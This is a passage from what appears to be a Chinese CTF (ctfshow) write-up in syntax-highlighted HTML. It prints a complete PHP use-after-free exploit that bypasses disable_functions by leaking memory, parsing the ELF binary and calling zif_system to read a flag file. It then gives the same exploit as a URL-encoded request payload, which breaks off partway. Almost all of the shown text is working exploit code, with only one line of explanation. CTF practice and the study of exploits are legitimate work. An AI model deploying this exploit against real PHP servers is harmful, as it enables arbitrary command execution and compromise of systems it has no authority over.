class="line"><span class="function"><span class="keyword">function</span> <span class="title">ctfshow</span>(<span class="params"><span class="variable">$cmd</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>, <span class="variable">$backtrace</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Vuln</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$backtrace</span>; </span><br><span class="line">            <span class="keyword">unset</span>(<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">            <span class="variable">$backtrace</span> = (<span class="keyword">new</span> <span class="built_in">Exception</span>)-&gt;<span class="title function_ invoke__">getTrace</span>();</span><br><span class="line">            <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$backtrace</span>[<span class="number">1</span>][<span class="string">&#x27;args&#x27;</span>])) &#123;</span><br><span class="line">                <span class="variable">$backtrace</span> = <span class="title function_ invoke__">debug_backtrace</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Helper</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>, <span class="variable">$b</span>, <span class="variable">$c</span>, <span class="variable">$d</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">str2ptr</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$address</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="variable">$s</span>-<span class="number">1</span>; <span class="variable">$j</span> &gt;= <span class="number">0</span>; <span class="variable">$j</span>--) &#123;</span><br><span class="line">            <span class="variable">$address</span> &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">            <span class="variable">$address</span> |= <span class="title function_ invoke__">ord</span>(<span class="variable">$str</span>[<span class="variable">$p</span>+<span class="variable">$j</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$address</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">ptr2str</span>(<span class="params"><span class="variable">$ptr</span>, <span class="variable">$m</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$out</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$m</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$out</span> .= <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;%c&quot;</span>,(<span class="variable">$ptr</span> &amp; <span class="number">0xff</span>));</span><br><span class="line">            <span class="variable">$ptr</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$out</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span>, <span class="variable">$v</span>, <span class="variable">$n</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$i</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$str</span>[<span class="variable">$p</span> + <span class="variable">$i</span>] = <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;%c&quot;</span>,(<span class="variable">$v</span> &amp; <span class="number">0xff</span>));</span><br><span class="line">            <span class="variable">$v</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">leak</span>(<span class="params"><span class="variable">$addr</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>;</span><br><span class="line">        <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x68</span>, <span class="variable">$addr</span> + <span class="variable">$p</span> - <span class="number">0x10</span>);</span><br><span class="line">        <span class="variable">$leak</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$helper</span>-&gt;a);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$s</span> != <span class="number">8</span>) &#123; <span class="variable">$leak</span> %= <span class="number">2</span> &lt;&lt; (<span class="variable">$s</span> * <span class="number">8</span>) - <span class="number">1</span>; &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$leak</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">parse_elf</span>(<span class="params"><span class="variable">$base</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$e_type</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x10</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$e_phoff</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x20</span>);</span><br><span class="line">        <span class="variable">$e_phentsize</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x36</span>, <span class="number">2</span>);</span><br><span class="line">        <span class="variable">$e_phnum</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x38</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$e_phnum</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$header</span> = <span class="variable">$base</span> + <span class="variable">$e_phoff</span> + <span class="variable">$i</span> * <span class="variable">$e_phentsize</span>;</span><br><span class="line">            <span class="variable">$p_type</span>  = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_flags</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">4</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_vaddr</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0x10</span>);</span><br><span class="line">            <span class="variable">$p_memsz</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0x28</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">6</span>) &#123; </span><br><span class="line"></span><br><span class="line">                <span class="variable">$data_addr</span> = <span class="variable">$e_type</span> == <span class="number">2</span> ? <span class="variable">$p_vaddr</span> : <span class="variable">$base</span> + <span class="variable">$p_vaddr</span>;</span><br><span class="line">                <span class="variable">$data_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">5</span>) &#123; </span><br><span class="line">                <span class="variable">$text_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$data_addr</span> || !<span class="variable">$text_size</span> || !<span class="variable">$data_size</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> [<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_basic_funcs</span>(<span class="params"><span class="variable">$base</span>, <span class="variable">$elf</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">list</span>(<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>) = <span class="variable">$elf</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$data_size</span> / <span class="number">8</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$data_addr</span>, <span class="variable">$i</span> * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$leak</span>);</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x746e6174736e6f63</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$data_addr</span>, (<span class="variable">$i</span> + <span class="number">4</span>) * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$leak</span>);</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x786568326e6962</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$data_addr</span> + <span class="variable">$i</span> * <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_binary_base</span>(<span class="params"><span class="variable">$binary_leak</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$base</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$start</span> = <span class="variable">$binary_leak</span> &amp; <span class="number">0xfffffffffffff000</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x1000</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$addr</span> = <span class="variable">$start</span> - <span class="number">0x1000</span> * <span class="variable">$i</span>;</span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span>, <span class="number">0</span>, <span class="number">7</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> == <span class="number">0x10102464c457f</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$addr</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_system</span>(<span class="params"><span class="variable">$basic_funcs</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$addr</span> = <span class="variable">$basic_funcs</span>;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="variable">$f_entry</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span>);</span><br><span class="line">            <span class="variable">$f_name</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$f_entry</span>, <span class="number">0</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$f_name</span> == <span class="number">0x6d6574737973</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span> + <span class="number">8</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$addr</span> += <span class="number">0x20</span>;</span><br><span class="line">        &#125; <span class="keyword">while</span>(<span class="variable">$f_entry</span> != <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">trigger_uaf</span>(<span class="params"><span class="variable">$arg</span></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$arg</span> = <span class="title function_ invoke__">str_shuffle</span>(<span class="string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);</span><br><span class="line">        <span class="variable">$vuln</span> = <span class="keyword">new</span> <span class="title class_">Vuln</span>();</span><br><span class="line">        <span class="variable">$vuln</span>-&gt;a = <span class="variable">$arg</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stristr</span>(PHP_OS, <span class="string">&#x27;WIN&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;This PoC is for *nix systems only.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$n_alloc</span> = <span class="number">10</span>; </span><br><span class="line">    <span class="variable">$contiguous</span> = [];</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n_alloc</span>; <span class="variable">$i</span>++)</span><br><span class="line">        <span class="variable">$contiguous</span>[] = <span class="title function_ invoke__">str_shuffle</span>(<span class="string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">trigger_uaf</span>(<span class="string">&#x27;x&#x27;</span>);</span><br><span class="line">    <span class="variable">$abc</span> = <span class="variable">$backtrace</span>[<span class="number">1</span>][<span class="string">&#x27;args&#x27;</span>][<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$helper</span> = <span class="keyword">new</span> <span class="title class_">Helper</span>;</span><br><span class="line">    <span class="variable">$helper</span>-&gt;b = <span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$x</span></span>) </span>&#123; &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$abc</span>) == <span class="number">79</span> || <span class="title function_ invoke__">strlen</span>(<span class="variable">$abc</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;UAF failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$closure_handlers</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="variable">$php_heap</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0x58</span>);</span><br><span class="line">    <span class="variable">$abc_addr</span> = <span class="variable">$php_heap</span> - <span class="number">0xc8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x60</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x70</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x10</span>, <span class="variable">$abc_addr</span> + <span class="number">0x60</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x18</span>, <span class="number">0xa</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$closure_obj</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$binary_leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$closure_handlers</span>, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$base</span> = <span class="title function_ invoke__">get_binary_base</span>(<span class="variable">$binary_leak</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t determine binary base address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$elf</span> = <span class="title function_ invoke__">parse_elf</span>(<span class="variable">$base</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t parse ELF header&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$basic_funcs</span> = <span class="title function_ invoke__">get_basic_funcs</span>(<span class="variable">$base</span>, <span class="variable">$elf</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get basic_functions address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$zif_system</span> = <span class="title function_ invoke__">get_system</span>(<span class="variable">$basic_funcs</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get zif_system address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="variable">$fake_obj_offset</span> = <span class="number">0xd0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x110</span>; <span class="variable">$i</span> += <span class="number">8</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="variable">$fake_obj_offset</span> + <span class="variable">$i</span>, <span class="title function_ invoke__">leak</span>(<span class="variable">$closure_obj</span>, <span class="variable">$i</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x20</span>, <span class="variable">$abc_addr</span> + <span class="variable">$fake_obj_offset</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x38</span>, <span class="number">1</span>, <span class="number">4</span>); </span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x68</span>, <span class="variable">$zif_system</span>); </span><br><span class="line"></span><br><span class="line">    (<span class="variable">$helper</span>-&gt;b)(<span class="variable">$cmd</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">ctfshow</span>(<span class="string">&quot;cat /flag0.txt&quot;</span>);<span class="title function_ invoke__">ob_end_flush</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>于是payload就是：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="function"><span class="keyword">function</span>%20<span class="title">ctfshow</span>(<span class="params">%<span class="number">24</span>cmd</span>)%20%7<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20<span class="title">global</span>%20%24<span class="title">abc</span>%2<span class="title">C</span>%20%24<span class="title">helper</span>%2<span class="title">C</span>%20%24<span class="title">backtrace</span>%3<span class="title">B</span>%0<span class="title">A</span>%0<span class="title">A</span>%20%20%20%20<span class="title">class</span>%20<span class="title">Vuln</span>%20%7<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20<span class="title">public</span>%20%24<span class="title">a</span>%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20<span class="title">public</span>%20<span class="title">function</span>%20<span class="title">__destruct</span>(<span class="params"></span>)%20%7<span class="title">B</span>%20%0<span class="title">A</span>%20%20%20%20%20%20%20%20%20%20%20%20<span class="title">global</span>%20%24<span class="title">backtrace</span>%3<span class="title">B</span>%20%0<span class="title">A</span>%20%20%20%20%20%20%20%20%20%20%20%20<span class="title">unset</span>(<span class="params">%<span class="number">24</span>this-%<span class="number">3</span>Ea</span>)%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%20%20%20%20%24<span class="title">backtrace</span>%20%3<span class="title">D</span>%20(<span class="params"><span class="keyword">new</span>%<span class="number">20</span><span class="built_in">Exception</span></span>)-%3<span class="title">EgetTrace</span>(<span class="params"></span>)%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%20%20%20%20<span class="title">if</span>(<span class="params">!<span class="keyword">isset</span>(<span class="params">%<span class="number">24</span>backtrace%<span class="number">5</span>B1%<span class="number">5</span>D%<span class="number">5</span>B<span class="string">&#x27;args&#x27;</span>%<span class="number">5</span>D</span>)</span>)%20%7<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24<span class="title">backtrace</span>%20%3<span class="title">D</span>%20<span class="title">debug_backtrace</span>(<span class="params"></span>)%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%20%20%20%20%7<span class="title">D</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%7<span class="title">D</span>%0<span class="title">A</span>%20%20%20%20%7<span class="title">D</span>%0<span class="title">A</span>%0<span class="title">A</span>%20%20%20%20<span class="title">class</span>%20<span class="title">Helper</span>%20%7<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20<span class="title">public</span>%20%24<span class="title">a</span>%2<span class="title">C</span>%20%24<span class="title">b</span>%2<span class="title">C</span>%20%24<span class="title">c</span>%2<span class="title">C</span>%20%24<span class="title">d</span>%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%7<span class="title">D</span>%0<span class="title">A</span>%0<span class="title">A</span>%20%20%20%20<span class="title">function</span>%20<span class="title">str2ptr</span>(<span class="params">%<span class="number">26</span>%<span class="number">24</span>str%<span class="number">2</span>C%<span class="number">20</span>%<span class="number">24</span>p%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">200</span>%<span class="number">2</span>C%<span class="number">20</span>%<span class="number">24</span>s%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">208</span></span>)%20%7<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%24<span class="title">address</span>%20%3<span class="title">D</span>%200%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20<span class="title">for</span>(<span class="params">%<span class="number">24</span>j%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">20</span>%<span class="number">24</span>s-<span class="number">1</span>%<span class="number">3</span>B%<span class="number">20</span>%<span class="number">24</span>j%<span class="number">20</span>%<span class="number">3</span>E%<span class="number">3</span>D%<span class="number">200</span>%<span class="number">3</span>B%<span class="number">20</span>%<span class="number">24</span>j--</span>)%20%7<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%20%20%20%20%24<span class="title">address</span>%20%3<span class="title">C</span>%3<span class="title">C</span>%3<span class="title">D</span>%208%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%20%20%20%20%24<span class="title">address</span>%20%7<span class="title">C</span>%3<span class="title">D</span>%20<span class="title">ord</span>(<span class="params">%<span class="number">24</span>str%<span class="number">5</span>B%<span class="number">24</span>p%<span class="number">2</span>B%<span class="number">24</span>j%<span class="number">5</span>D</span>)%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%7<span class="title">D</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20<span class="title">return</span>%20%24<span class="title">address</span>%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%7<span class="title">D</span>%0<span class="title">A</span>%0<span class="title">A</span>%20%20%20%20<span class="title">function</span>%20<span class="title">ptr2str</span>(<span class="params">%<span class="number">24</span>ptr%<span class="number">2</span>C%<span class="number">20</span>%<span class="number">24</span>m%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">208</span></span>)%20%7<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%24<span class="title">out</span>%20%3<span class="title">D</span>%20%22%22%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20<span class="title">for</span>%20(<span class="params">%<span class="number">24</span>i%<span class="number">3</span>D0%<span class="number">3</span>B%<span class="number">20</span>%<span class="number">24</span>i%<span class="number">20</span>%<span class="number">3</span>C%<span class="number">20</span>%<span class="number">24</span>m%<span class="number">3</span>B%<span class="number">20</span>%<span class="number">24</span>i%<span class="number">2</span>B%<span class="number">2</span>B</span>)%20%7<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%20%20%20%20%24<span class="title">out</span>%20.%3<span class="title">D</span>%20<span class="title">sprintf</span>(<span class="params">%<span class="number">22</span>%<span class="number">25</span>c%<span class="number">22</span>%<span class="number">2</span>C(<span class="params">%<span class="number">24</span>ptr%<span class="number">20</span>%<span class="number">26</span>%<span class="number">200</span>xff</span>)</span>)%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%20%20%20%20%24<span class="title">ptr</span>%20%3<span class="title">E</span>%3<span class="title">E</span>%3<span class="title">D</span>%208%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%7<span class="title">D</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20<span class="title">return</span>%20%24<span class="title">out</span>%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%7<span class="title">D</span>%0<span class="title">A</span>%0<span class="title">A</span>%20%20%20%20<span class="title">function</span>%20<span class="title">write</span>(<span class="params">%<span class="number">26</span>%<span class="number">24</span>str%<span class="number">2</span>C%<span class="number">20</span>%<span class="number">24</span>p%<span class="number">2</span>C%<span class="number">20</span>%<span class="number">24</span>v%<span class="number">2</span>C%<span class="number">20</span>%<span class="number">24</span>n%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">208</span></span>)%20%7<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%24<span class="title">i</span>%20%3<span class="title">D</span>%200%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20<span class="title">for</span>(<span class="params">%<span class="number">24</span>i%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">200</span>%<span class="number">3</span>B%<span class="number">20</span>%<span class="number">24</span>i%<span class="number">20</span>%<span class="number">3</span>C%<span class="number">20</span>%<span class="number">24</span>n%<span class="number">3</span>B%<span class="number">20</span>%<span class="number">24</span>i%<span class="number">2</span>B%<span class="number">2</span>B</span>)%20%7<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%20%20%20%20%24<span class="title">str</span>%5<span class="title">B</span>%24<span class="title">p</span>%20%2<span class="title">B</span>%20%24<span class="title">i</span>%5<span class="title">D</span>%20%3<span class="title">D</span>%20<span class="title">sprintf</span>(<span class="params">%<span class="number">22</span>%<span class="number">25</span>c%<span class="number">22</span>%<span class="number">2</span>C(<span class="params">%<span class="number">24</span>v%<span class="number">20</span>%<span class="number">26</span>%<span class="number">200</span>xff</span>)</span>)%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%20%20%20%20%24<span class="title">v</span>%20%3<span class="title">E</span>%3<span class="title">E</span>%3<span class="title">D</span>%208%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%7<span class="title">D</span>%0<span class="title">A</span>%20%20%20%20%7<span class="title">D</span>%0<span class="title">A</span>%0<span class="title">A</span>%20%20%20%20<span class="title">function</span>%20<span class="title">leak</span>(<span class="params">%<span class="number">24</span>addr%<span class="number">2</span>C%<span class="number">20</span>%<span class="number">24</span>p%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">200</span>%<span class="number">2</span>C%<span class="number">20</span>%<span class="number">24</span>s%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">208</span></span>)%20%7<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20<span class="title">global</span>%20%24<span class="title">abc</span>%2<span class="title">C</span>%20%24<span class="title">helper</span>%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20<span class="title">write</span>(<span class="params">%<span class="number">24</span>abc%<span class="number">2</span>C%<span class="number">200</span>x68%<span class="number">2</span>C%<span class="number">20</span>%<span class="number">24</span>addr%<span 